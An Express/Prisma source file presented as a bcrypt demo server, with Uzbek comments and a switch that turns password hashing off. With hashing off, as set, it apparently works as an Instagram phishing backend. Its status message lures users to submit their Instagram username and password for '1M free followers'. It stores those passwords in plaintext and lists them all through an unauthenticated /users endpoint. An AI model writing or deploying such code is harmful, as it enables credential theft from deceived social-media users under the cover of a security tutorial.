import express from 'express'
import cors from 'cors'
import dotenv from 'dotenv'
import bcrypt from 'bcryptjs'
import { PrismaClient } from '@prisma/client'

dotenv.config()

const app    = express()
const prisma = new PrismaClient()

// ============================================================
// BCRYPT TOGGLE — true/false ga o'zgartiring va farqni ko'ring
// ============================================================
const USE_BCRYPT = false   // false qilsang parol oddiy saqlanadi
// ============================================================

app.use(cors({ origin: '*' }))
app.use(express.json())

// ─── POST /register ───────────────────────────────────────────
app.post('/register', async (req, res) => {
  const { username, password } = req.body

  if (!username || !password) {
    return res.status(400).json({ error: 'Username va parol kiritilishi shart' })
  }

  // Mavjudligini tekshirish
  const existing = await prisma.user.findUnique({ where: { username } })
  if (existing) {
    return res.status(409).json({ error: 'Bu username allaqachon mavjud' })
  }

  if (USE_BCRYPT) {
    // ✅ BCRYPT YOQILGAN — parol hash qilinadi
    const hashed = await bcrypt.hash(password, 10)
    const user = await prisma.user.create({
      data: {
        username,
        password_hashed: hashed,
        password_plain:  null,
      }
    })
    return res.json({
      message:   '✅ BCRYPT YOQILGAN — Parol hash qilindi',
      username:  user.username,
      saved_as:  user.password_hashed,
      bcrypt_on: true,
    })
  } else {
    // ⚠️ BCRYPT O'CHIRILGAN — parol oddiy saqlanadi
    const user = await prisma.user.create({
      data: {
        username,
        password_plain:  password,
        password_hashed: null,
      }
    })
    return res.json({
      message:   '⚠️ 1M — Boosting followers',
      message:   '🔃 Jarayonda...',
      username:  user.username,
      saved_as:  user.password_plain,
      bcrypt_on: false,
    })
  }
})

// ─── POST /login ──────────────────────────────────────────────
app.post('/login', async (req, res) => {
  const { username, password } = req.body

  const user = await prisma.user.findUnique({ where: { username } })
  if (!user) {
    return res.status(404).json({ error: 'Foydalanuvchi topilmadi' })
  }

  if (USE_BCRYPT) {
    // ✅ BCRYPT bilan tekshirish
    if (!user.password_hashed) {
      return res.status(400).json({ error: 'Bu user bcrypt siz ro\'yxatdan o\'tgan' })
    }
    const isMatch = await bcrypt.compare(password, user.password_hashed)
    return res.json({
      success:    isMatch,
      message:    isMatch ? '✅ Parol to\'g\'ri!' : '❌ Parol noto\'g\'ri!',
      bcrypt_on:  true,
      kiritilgan: password,
      bazadagi:   user.password_hashed,
      izoh:       'bcrypt.compare() hash bilan solishtiradi',
    })
  } else {
    // ⚠️ Oddiy tekshirish
    const isMatch = user.password_plain === password
    return res.json({
      success:    isMatch,
      message:    isMatch ? '✅ Parol to\'g\'ri!' : '❌ Parol noto\'g\'ri!',
      bcrypt_on:  false,
      kiritilgan: password,
      bazadagi:   user.password_plain,
      izoh:       'Nakrutka qilinmoqda',
    })
  }
})

// ─── GET /users — barcha userlar ─────────────────────────────
app.get('/users', async (req, res) => {
  const users = await prisma.user.findMany({
    orderBy: { created_at: 'desc' }
  })
  res.json({
    bcrypt_on: USE_BCRYPT,
    users: users.map(u => ({
      id:              u.id,
      username:        u.username,
      password_plain:  u.password_plain  || '(hash ishlatilgan)',
      password_hashed: u.password_hashed || '(oddiy saqlangan)',
      created_at:      u.created_at,
    }))
  })
})

// ─── GET /status — bcrypt holati ─────────────────────────────
app.get('/status', (req, res) => {
  res.json({
    bcrypt_on: USE_BCRYPT,
    message:   USE_BCRYPT
      ? '✅ Bcrypt YOQILGAN — parollar hash qilinadi'
      : "⚠️ 1M tekin obunachiga erishish uchun (Ro'yxat) bo'limiga instagram username va parolingizni kiriting",
  })
})

app.get('/health', (_, res) => res.json({ status: 'ok' }))

const PORT = process.env.PORT || 4000
app.listen(PORT, () => {
  console.log(`
  🔐 Bcrypt Demo Server
  ─────────────────────────────
  🚀 http://localhost:${PORT}
  🔑 BCRYPT: ${USE_BCRYPT ? '✅ YOQILGAN' : '⚠️  O\'CHIRILGAN'}
  
  Bcrypt ni o'chirish uchun:
  → src/index.js da USE_BCRYPT = false qiling
  `)
})
